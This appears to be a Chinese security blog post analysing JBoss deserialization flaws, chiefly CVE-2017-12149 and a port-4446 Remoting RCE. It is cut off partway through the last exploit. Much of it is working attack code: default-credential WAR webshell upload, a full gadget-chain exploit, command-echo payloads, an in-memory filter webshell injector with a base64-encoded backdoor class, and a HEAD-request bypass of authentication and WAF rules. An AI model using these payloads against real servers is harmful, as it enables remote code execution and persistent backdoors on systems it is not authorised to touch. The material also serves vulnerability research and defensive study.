title: Jboss反序列化漏洞
author: bmth
tags:
  - 反序列化
  - CVE-2017-12149
categories:
  - java
top_img: 'https://img-blog.csdnimg.cn/543aa4fc252147328ebfdb95570ef11b.png'
cover: 'https://img-blog.csdnimg.cn/543aa4fc252147328ebfdb95570ef11b.png'
date: 2023-02-21 15:53:00
---
![](https://img-blog.csdnimg.cn/543aa4fc252147328ebfdb95570ef11b.png)

Jboss是一个基于J2EE的开放源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用

## Admin Console弱口令
默认密码为admin、admin
发现 Web Application (WAR) 可以上传war包，那么我们传一个木马
![](https://img-blog.csdnimg.cn/f18cb804599c46fd8a61227684575c53.png)

打包为war：`jar cvf shell.war shell.jsp`，上传上去即可，上传目录就是war包名所在的文件夹`/shell/shell.jsp`


默认密码位置：
```
/jboss-6.1.0.Final/server/all/conf/props/jmx-console-users.properties
/jboss-6.1.0.Final/server/default/conf/props/jmx-console-users.properties
```

参考：
[Jboss渗透合集](https://forum.butian.net/share/504)

## CVE-2017-12149
该漏洞为 Java反序列化错误类型，位于JBoss的HttpInvoker组件中的ReadOnlyAccessFilter过滤器中，其doFilter方法在没有进行任何安全检查和限制的情况下尝试将来自客户端的序列化数据流进行反序列化，导致恶意访问者通过精心设计的序列化数据执行任意代码

影响版本：5.x、6.x


下载地址：[https://jbossas.jboss.org/downloads/](https://jbossas.jboss.org/downloads/)，我下载的版本为JBoss AS 6.1.0.Final

### 漏洞分析
注意这里动调需要将`jboss-6.1.0.Final/server/all/deploy/httpha-invoker.sar/invoker.war/WEB-INF/classes/org`目录打包

执行命令`jar cvf org.jar ./org`，然后导入即可
![](https://img-blog.csdnimg.cn/227dab99e2da4fae9fbf06e443661ee1.png)

在`org.jboss.invocation.http.servlet.ReadOnlyAccessFilter#doFilter`方法下个断点
![](https://img-blog.csdnimg.cn/5855ff702fa94c75b8cfbbcb8d4be560.png)

可以看出它从POST中获取数据，然后调用readObject()方法对数据流进行反序列化
在web.xml中可以看到路径为`/readonly/*`
![](https://img-blog.csdnimg.cn/4d0175c85a6c4316908d4f1c404ec4c4.png)

在`org.jboss.invocation.http.servlet.InvokerServlet#processRequest`同样存在反序列化点
![](https://img-blog.csdnimg.cn/4fcab0a142924acea599133caad04f82.png)

发现doGet和doPost都会调用该方法
![](https://img-blog.csdnimg.cn/235255e73fee4e62bf6481a3b79aaf36.png)

依照web.xml，得出存在漏洞的路径为：
```
/invoker/readonly/*
/invoker/JMXInvokerServlet/*
/invoker/EJBInvokerServlet/*
/invoker/JMXInvokerHAServlet/*
/invoker/EJBInvokerHAServlet/*
/invoker/restricted/JMXInvokerServlet/*（需要登录）
```
可利用的链(注意版本)：
```
commons-collections-3.1.jar
commons-beanutils-1.8.0.jar
hibernate-core-3.6.6.Final.jar
```


### 漏洞利用
访问`/invoker/readonly`，发现http响应码500，说明存在漏洞
![](https://img-blog.csdnimg.cn/b15e98f2c1184974a4c2572536832936.png)

使用工具：[https://github.com/yunxu1/jboss-_CVE-2017-12149](https://github.com/yunxu1/jboss-_CVE-2017-12149)，即可rce
![](https://img-blog.csdnimg.cn/b57025b1783c4e0f9681a3ac93ca5d27.png)


#### JBossInterceptors1链
ysoserial上面有一个JBoss自带的一条反序列化链，exp如下：
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.jboss.interceptor.builder.InterceptionModelBuilder;
import org.jboss.interceptor.builder.MethodReference;
import org.jboss.interceptor.proxy.DefaultInvocationContextFactory;
import org.jboss.interceptor.proxy.InterceptorMethodHandler;
import org.jboss.interceptor.reader.ClassMetadataInterceptorReference;
import org.jboss.interceptor.reader.DefaultMethodMetadata;
import org.jboss.interceptor.reader.ReflectiveClassMetadata;
import org.jboss.interceptor.reader.SimpleInterceptorMetadata;
import org.jboss.interceptor.spi.instance.InterceptorInstantiator;
import org.jboss.interceptor.spi.metadata.InterceptorReference;
import org.jboss.interceptor.spi.metadata.MethodMetadata;
import org.jboss.interceptor.spi.model.InterceptionModel;
import org.jboss.interceptor.spi.model.InterceptionType;
import tools.Evil;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.*;

public class JBossInterceptors1 {
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception{
        InterceptionModelBuilder builder = InterceptionModelBuilder.newBuilderFor(HashMap.class);
        ReflectiveClassMetadata metadata = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
        InterceptorReference interceptorReference = ClassMetadataInterceptorReference.of(metadata);

        Set<InterceptionType> s = new HashSet<InterceptionType>();
        s.add(org.jboss.interceptor.spi.model.InterceptionType.POST_ACTIVATE);

        Constructor defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(Set.class, MethodReference.class);
        defaultMethodMetadataConstructor.setAccessible(true);
        MethodMetadata methodMetadata = (MethodMetadata) defaultMethodMetadataConstructor.newInstance(s, MethodReference.of(TemplatesImpl.class.getMethod("newTransformer"), true));

        List list = new ArrayList();
        list.add(methodMetadata);
        Map<org.jboss.interceptor.spi.model.InterceptionType, List<MethodMetadata>> hashMap = new HashMap<org.jboss.interceptor.spi.model.InterceptionType, List<MethodMetadata>>();

        hashMap.put(org.jboss.interceptor.spi.model.InterceptionType.POST_ACTIVATE, list);
        SimpleInterceptorMetadata simpleInterceptorMetadata = new SimpleInterceptorMetadata(interceptorReference, true, hashMap);

        builder.interceptAll().with(simpleInterceptorMetadata);

        InterceptionModel model = builder.build();

        HashMap map = new HashMap();
        map.put("ysoserial", "ysoserial");

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{ClassPool.getDefault().get(Evil.class.getName()).toBytecode()});
        setFieldValue(obj, "_name", "1");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        DefaultInvocationContextFactory factory = new DefaultInvocationContextFactory();

        InterceptorInstantiator interceptorInstantiator = new InterceptorInstantiator() {
            public Object createFor(InterceptorReference paramInterceptorReference) {
                return obj;
            }
        };
        InterceptorMethodHandler exp = new InterceptorMethodHandler(map, metadata, model, interceptorInstantiator, factory);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(baos);
        out.writeObject(exp);
        out.close();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
```
简单分析一下，看到`org.jboss.interceptor.proxy.InterceptorMethodHandler#readObject`
![](https://img-blog.csdnimg.cn/c9f150ccbf104d7bb76dc0c453e647b7.png)

执行了 executeInterception 方法，并且 targetInstance 不为空，isProxy()为true，跟进
![](https://img-blog.csdnimg.cn/4846c21fa3bf42bbabeb2b94d50c6bfb.png)

这里的instance就是我们自定义的createFor方法返回的obj，然后使用`DefaultInvocationContextFactory#newInvocationContext`进行处理
![](https://img-blog.csdnimg.cn/5f3ca399ed1e43b49a37c2daa0e5eb0d.png)

这里return了 InterceptorInvocationContext 类，走到了`org.jboss.interceptor.proxy.SimpleInterceptionChain#invokeNextInterceptor`
![](https://img-blog.csdnimg.cn/7fd8e1e8f2ca4a6099e3695737f7213d.png)

最后调用到了`org.jboss.interceptor.proxy.InterceptorInvocation#invoke`
![](https://img-blog.csdnimg.cn/d9dbb9576e194986b49b2378712fd2a0.png)

可以看到反射调用任意的类的任意方法

调用栈如下：
```
getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invoke:74, InterceptorInvocation$InterceptorMethodInvocation (org.jboss.interceptor.proxy)
invokeNextInterceptor:87, SimpleInterceptionChain (org.jboss.interceptor.proxy)
executeInterception:133, InterceptorMethodHandler (org.jboss.interceptor.proxy)
readObject:158, InterceptorMethodHandler (org.jboss.interceptor.proxy)
```


#### 回显以及内存马构造
首先看一下写进去的`/tmp/RunCheckConfig.class`代码：
```java
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;

public class RunCheckConfig {
    public RunCheckConfig(String paramcmd) throws Exception {
        StringBuffer localStringBuffer = new StringBuffer();
        File file = new File("/tmp/RunCheckConfig.class");
        if (file.exists()) {
            localStringBuffer.append("[L291919]\r\n");
        } else {
            localStringBuffer.append("[W291013]\r\n");
        }

        Process localProcess = Runtime.getRuntime().exec(paramcmd);
        BufferedReader localBufferedReader = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));

        String str1;
        while((str1 = localBufferedReader.readLine()) != null) {
            localStringBuffer.append(str1).append("\n");
        }

        String str2 = localStringBuffer.toString();
        Exception localException = new Exception(str2);
        throw localException;
    }
}
```
由于这个漏洞会将报错结果显示出来，这里可以将命令执行的结果添加到报错信息中，就可以得到命令执行的结果了，但这个方法并不通用，我们需要一个更好的方法

我们直接看到`Thread.currentThread()`当前线程，发现可以找到Request
![](https://img-blog.csdnimg.cn/9ef9510317784ff09ab09de0c93d8d60.png)

使用反射来获取`org.apache.catalina.connector.Request`，然后通过getResponse()方法得到Response，最后getWriter()方法回显，代码如下：
```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

public class JbossEcho extends AbstractTranslet{
    static {
        try {
            Thread thread = Thread.currentThread();
            Field threadLocals = Thread.class.getDeclaredField("threadLocals");
            threadLocals.setAccessible(true);
            Object threadLocalMap = threadLocals.get(thread);

            Class threadLocalMapClazz = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
            Field tableField = threadLocalMapClazz.getDeclaredField("table");
            tableField.setAccessible(true);
            Object[] Entries = (Object[]) tableField.get(threadLocalMap);

            Class entryClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
            Field entryValueField = entryClass.getDeclaredField("value");
            entryValueField.setAccessible(true);

            for (Object entry : Entries) {
                if (entry != null) {
                    try {
                        Object httpConnection = entryValueField.get(entry);
                        if (httpConnection != null) {
                            if (httpConnection.getClass().getName().equals("org.apache.catalina.connector.Request")) {
                                org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request)httpConnection;
                                org.apache.catalina.connector.Response response = request.getResponse();
                                boolean isLinux = true;
                                String osTyp = System.getProperty("os.name");
                                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                                    isLinux = false;
                                }
                                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getHeader("cmd")} : new String[]{"cmd.exe", "/c", request.getHeader("cmd")};
                                InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
                                Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
                                String output = scanner.hasNext() ? scanner.next() : "";
                                response.getWriter().write(output);
                                response.getWriter().flush();
                            }
                        }
                    } catch (IllegalAccessException e) {

                    }
                }
            }
        } catch (Exception e) {
        }
    }

    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }
    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }
}
```
![](https://img-blog.csdnimg.cn/763805939147474199f8124aaf5954b8.png)

接下来就是内存马的构造了，由于我们这里是低版本的jboss，发现jbossweb.jar内置了tomcat
![](https://img-blog.csdnimg.cn/85c7490a67064d4eabb6f19be2359f55.png)

我们直接拿tomcat的内存马即可，但是测试发现这个jboss版本的FilterDef类没有setFilter这个方法，访问我们的内存马发现报错
![](https://img-blog.csdnimg.cn/7d3adea35df84293af811e4c76c03eb0.png)

看到它自定义了规则，这个class文件得存在才能创建Filter，我们就先写进去class文件，然后访问再删除就可以了
首先得知道绝对路径，这个自己找，然后创建一个EvilFilter
```java
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

public class EvilFilter implements Filter {
    public void init(FilterConfig filterConfig) throws ServletException {
        File file=new File("/opt/jboss/jboss-6.1.0.Final/server/all/deploy/httpha-invoker.sar/invoker.war/WEB-INF/EvilFilter.class");
        if(file.exists()){
            file.delete();
        }
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException,ServletException{
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        if (req.getParameter("cmd") != null){
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
            InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
            String output = scanner.hasNext() ? scanner.next() : "";
            servletResponse.getWriter().write(output);
            servletResponse.getWriter().flush();
            return;
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }
    public void destroy() {}
}
```
这里存在一个public类`javax.security.jacc.PolicyContext`，它有个getContext方法可以直接获取Request
![](https://img-blog.csdnimg.cn/07688bc5eb154d98ad7073c35ce73936.png)

然后通过反射获取standardContext和filterConfigs

exp：
```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.deploy.FilterDef;
import org.apache.catalina.deploy.FilterMap;

import javax.servlet.*;
import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Map;

public class JbossInjectFilter extends AbstractTranslet {
    static {
        try {
            File file=new File("/opt/jboss/jboss-6.1.0.Final/server/all/deploy/httpha-invoker.sar/invoker.war/WEB-INF/EvilFilter.class");
            FileOutputStream fout=new FileOutputStream(file,true);
            byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQApwoAIwBYBwBZCABaCgACAFsKAAIAXAoAAgBdBwBeCABfCwAHAGAIAGEKAGIAYwoADwBkCABlCgAPAGYHAGcIAGgIAGkIAGoIAGsKAGwAbQoAbABuCgBvAHAHAHEKABcAcggAcwoAFwB0CgAXAHUKABcAdggAdwsAeAB5CgB6AHsKAHoAfAsAfQB+BwB/BwCABwCBAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAxMRXZpbEZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAARmaWxlAQAOTGphdmEvaW8vRmlsZTsBAA1TdGFja01hcFRhYmxlBwBZAQAKRXhjZXB0aW9ucwcAggEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAB2lzTGludXgBAAFaAQAFb3NUeXABABJMamF2YS9sYW5nL1N0cmluZzsBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAC2lucHV0U3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAHc2Nhbm5lcgEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAZvdXRwdXQBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwcAXgcAZwcAPQcAgwcAcQcAfwcAhAcAhQcAhgcAhwEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAPRXZpbEZpbHRlci5qYXZhDAAlACYBAAxqYXZhL2lvL0ZpbGUBAGYvb3B0L2pib3NzL2pib3NzLTYuMS4wLkZpbmFsL3NlcnZlci9hbGwvZGVwbG95L2h0dHBoYS1pbnZva2VyLnNhci9pbnZva2VyLndhci9XRUItSU5GL0V2aWxGaWx0ZXIuY2xhc3MMACUAiAwAiQCKDACLAIoBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQADY21kDACMAI0BAAdvcy5uYW1lBwCODACPAI0MAJAAkQEAA3dpbgwAkgCTAQAQamF2YS9sYW5nL1N0cmluZwEAAnNoAQACLWMBAAdjbWQuZXhlAQACL2MHAJQMAJUAlgwAlwCYBwCZDACaAJsBABFqYXZhL3V0aWwvU2Nhbm5lcgwAJQCcAQACXGEMAJ0AngwAnwCKDACgAJEBAAAHAIUMAKEAogcAowwApACIDAClACYHAIYMADYApgEACkV2aWxGaWx0ZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lucHV0U3RyZWFtAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAZleGlzdHMBAAMoKVoBAAZkZWxldGUBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEABG5leHQBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEABWZsdXNoAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhACIAIwABACQAAAAEAAEAJQAmAAEAJwAAAC8AAQABAAAABSq3AAGxAAAAAgAoAAAABgABAAAACAApAAAADAABAAAABQAqACsAAAABACwALQACACcAAABvAAMAAwAAABe7AAJZEgO3AARNLLYABZkACCy2AAZXsQAAAAMAKAAAABIABAAAAAoACgALABEADAAWAA4AKQAAACAAAwAAABcAKgArAAAAAAAXAC4ALwABAAoADQAwADEAAgAyAAAACAAB/AAWBwAzADQAAAAEAAEANQABADYANwACACcAAAHBAAUACwAAAL4rwAAHOgQZBBIIuQAJAgDGAKYENgUSCrgACzoGGQbGABMZBrYADBINtgAOmQAGAzYFFQWZACAGvQAPWQMSEFNZBBIRU1kFGQQSCLkACQIAU6cAHQa9AA9ZAxISU1kEEhNTWQUZBBIIuQAJAgBTOge4ABQZB7YAFbYAFjoIuwAXWRkItwAYEhm2ABo6CRkJtgAbmQALGQm2ABynAAUSHToKLLkAHgEAGQq2AB8suQAeAQC2ACCxLSssuQAhAwCxAAAAAwAoAAAAPgAPAAAAEgAGABMAEgAUABUAFQAcABYALgAXADEAGQBvABoAfAAbAIwAHACgAB0AqwAeALQAHwC1ACEAvQAiACkAAABwAAsAFQCgADgAOQAFABwAmQA6ADsABgBvAEYAPAA9AAcAfAA5AD4APwAIAIwAKQBAAEEACQCgABUAQgA7AAoAAAC+ACoAKwAAAAAAvgBDAEQAAQAAAL4ARQBGAAIAAAC+AEcASAADAAYAuABJAEoABAAyAAAANwAG/gAxBwBLAQcATCFZBwBN/gAuBwBNBwBOBwBPQQcATP8AFgAFBwBQBwBRBwBSBwBTBwBLAAAANAAAAAYAAgBUADUAAQBVACYAAQAnAAAAKwAAAAEAAAABsQAAAAIAKAAAAAYAAQAAACMAKQAAAAwAAQAAAAEAKgArAAAAAQBWAAAAAgBX");
            for (int i = 0; i < bytes.length; i++) {
                fout.write(bytes[i]);
            }
            fout.flush();
            fout.close();

            Object req = javax.security.jacc.PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
            Object servlet = req.getClass().getMethod("getServletContext", new Class[0]).invoke(req, new Object[0]);
            Field appctx = servlet.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servlet);

            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

            Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            String name = "shell";
            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName(name);
            filterDef.setFilterClass("EvilFilter");
            standardContext.addFilterDef(filterDef);
            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/shell");
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());

            standardContext.addFilterMapBefore(filterMap);
            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

            filterConfigs.put(name,filterConfig);
        }catch (Exception e){}
    }
    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }
    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }
}
```
看到成功执行命令
![](https://img-blog.csdnimg.cn/d7005aadbbca4b06ba3e686216289d3d.png)

缺点就是存在文件落地

可参考文章：
[Wildfly中间件内存马分析 ](https://xz.aliyun.com/t/12161)
[Jboss漏洞回显](https://www.jianshu.com/p/d142294a9466)

#### 绕过waf
首先`/invoker/readonly`路由是一个filter，所以任意的请求模式都可以触发(随意写XXX都可以)

但如果waf匹配了路由，就不好利用了，这里注意到一个特殊的路由`/invoker/restricted/JMXInvokerServlet`，正常访问是返回401， 在web.xml中有对`/restricted/*`路由做验证，必须在登录之后才能触发
![](https://img-blog.csdnimg.cn/10c0e03051d54bb299c3c25b23a5c646.png)

很明显能够看出只对GET/POST请求模式进行验证，如果非GET/POST还是能够访问，但是因为这个路由是Servlet不是Filter，所以不能够随意修改请求模式，请求模式必须是RFC 2068里所定义的GET/POST/PUT/DELETE等
![](https://img-blog.csdnimg.cn/8e67171561db44a0af5e0ff094284e40.png)

可以看到HEAD头会调用doGet，所以可以绕过登录实现反序列化，但是由于是NobodyResponse，所以我们需要在header头实现回显
改为：
```java
response.addHeader("echo",output);
response.flushBuffer();
```
![](https://img-blog.csdnimg.cn/f956324a21d7417587b46810f1ef087e.png)

看到header头处成功回显

参考：
[ 一次老版本jboss反序列化漏洞的利用分析](https://mp.weixin.qq.com/s/7oyRYlNUJ4neAdDRkxL2Rg)
[JBOSS CVE-2017-12149 WAF绕过之旅](https://www.yulegeyu.com/2021/03/05/JBOSS-CVE-2017-12149-WAF%E7%BB%95%E8%BF%87%E4%B9%8B%E6%97%85/)


## JBoss EAP/AS <= 6.* RCE
这个洞是在国外Alligator Conference 2019会议上的一个议题，PPT：[https://s3.amazonaws.com/files.joaomatosf.com/slides/alligator_slides.pdf](https://s3.amazonaws.com/files.joaomatosf.com/slides/alligator_slides.pdf)

议题中讲到了jboss的4446端口反序列化rce，和一条jndi注入的gadget

### 漏洞分析
在bindings-jboss-beans.xml文件中看到4446端口实现JBoss Remoting Connector
![](https://img-blog.csdnimg.cn/58dd606b775949cb953be5ac30d8d34f.png)

既然是JBoss Remoting Connector，就定位到 jboss-remoting.jar 里面的类

看到`org.jboss.remoting.transport.socket.ServerThread#dorun`，该线程类处理接收到的socket数据流
![](https://img-blog.csdnimg.cn/3f8dec7f629644589a8411b9a928ecb2.png)

通过 this.socketWrapper 获取socket的输入流和输出流，然后进入processInvocation方法处理，跟进
this.version通过 inputStream.read() 获取，处理了我们传入的0x16，读出来协议版本为22
![](https://img-blog.csdnimg.cn/7f814887ed8b42538768cf006eea608f.png)

跟进completeInvocation方法，发现调用了versionedRead方法
![](https://img-blog.csdnimg.cn/da64818b800e4dadab1f7e14a0bcb548.png)

继续跟进，由于这里version为22，调用`this.unmarshaller.read()`
![](https://img-blog.csdnimg.cn/d5cbcfe9b88141d79885d0a7b7194587.png)

走到`org.jboss.invocation.unified.marshall.InvocationUnMarshaller#read`
![](https://img-blog.csdnimg.cn/574b429dfdce4e6a9f0932d6f33f2cd7.png)

调用父类的read，`org.jboss.remoting.marshal.serializable.SerializableUnMarshaller#read`
![](https://img-blog.csdnimg.cn/2f5d5450295f40b884db63e12d68f708.png)


走到了`org.jboss.remoting.serialization.impl.java.JavaSerializationManager#receiveObject`
这里version为22，进入receiveObjectVersion2_2方法处理
![](https://img-blog.csdnimg.cn/7f71f21b70f643988733cc47dcd9fe08.png)

最终可以看到 objInputStream.readObject() 反序列化
![](https://img-blog.csdnimg.cn/bdec260c87884f30a5ad15cf08797368.png)

调用栈：
```
receiveObjectVersion2_2:238, JavaSerializationManager (org.jboss.remoting.serialization.impl.java)
receiveObject:138, JavaSerializationManager (org.jboss.remoting.serialization.impl.java)
read:123, SerializableUnMarshaller (org.jboss.remoting.marshal.serializable)
read:59, InvocationUnMarshaller (org.jboss.invocation.unified.marshall)
versionedRead:900, ServerThread (org.jboss.remoting.transport.socket)
completeInvocation:754, ServerThread (org.jboss.remoting.transport.socket)
processInvocation:744, ServerThread (org.jboss.remoting.transport.socket)
dorun:548, ServerThread (org.jboss.remoting.transport.socket)
run:234, ServerThread (org.jboss.remoting.transport.socket)
```


### 漏洞利用
搞个cb链，这里使用的是Y4er师傅的exp：
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.lang.ArrayUtils;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.PriorityQueue;

public class JbossRemoting {
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception {
        byte[] evil= ClassPool.getDefault().get(Evilcalc.class.getName()).toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{evil});
        setFieldValue(obj, "_name", "1");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(baos);
        out.writeObject(queue);
        out.close();

        byte[] serialize = baos.toByteArray();

        byte[] aced = Arrays.copyOfRange(serialize, 0, 4);
        byte[] range = Arrays.copyOfRange(serialize, 4, serialize.length);
